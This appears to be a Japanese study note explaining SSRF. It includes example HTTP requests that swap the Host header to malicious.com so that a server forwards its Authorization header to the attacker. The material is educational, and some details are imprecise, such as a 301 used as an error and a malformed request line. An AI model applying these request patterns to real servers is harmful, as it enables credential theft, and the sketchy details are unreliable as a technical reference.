---
分類: 攻撃手段
---
## 概要
SSRF (Server-Side Request Forgery)
スクリプトで、サーバに攻撃者の埋め込んだHTTPリクエストを実施させる攻撃。

## 仕組み
攻撃者が、脆弱性のあるサーバーの外部リンクへリクエストを送る機能を悪用し、リクエスト先のリンクを自分の用意した悪意のあるリンクにすり替えして、そこにリクエストを送らせる。

例えば、通常では下記のようにapiからデータを取得するリンクがあるとする
```url
https://example.com/fetch?url=https://api.example.com/data
```
そこのurlをすり替えることで、SSRFを実施することができる。

さらに複雑な手法として、ユーザーのアクセスサイトが別のサイトから情報を取得するプロセスがあるとして、
1.攻撃者がサイトに以下のリクエストを作成し、わざとエラーを発生させるように情報サイトの存在しないキーを埋め込み、hostを通常のアクセス中のサイトのFQDNから悪意のあるサイトへ変更
```HTTP
GET /key/not-existing-key HTTP/1.1
Host: malicious.com --changed from example.com

```
2.アクセス中のサイトから、データサイトへ上記のデータを含めてリクエストを送信、エラーハンドリングに使用するreturnURLに攻撃者が改竄したhostと組み合わせたリンクになるので、エラーが発生する場合は攻撃者のリンクがアクセス中のサイトに返される
```HTTP
GET /key/not-existing-key?returnURL=malicious.com/error HTTP/1.1

Authorization:Basic
...
```

3.データサイトに存在しないキーがクエリされたのでエラーメッセージが返される
```HTTP
HTTP/1.1 301 MOVED PERMANENTLY
```

4.エラーメッセージを受信したアクセスサイトがフォールバックして、returnURLにアクセス
```HTTP
GET malicious.com/error?errorcode=301 HTTP/1.1
```

こうしたことで、アクセスサイトがデータサイトに認証するためのヘッダーなども一緒に転送され、認証情報などが漏洩する。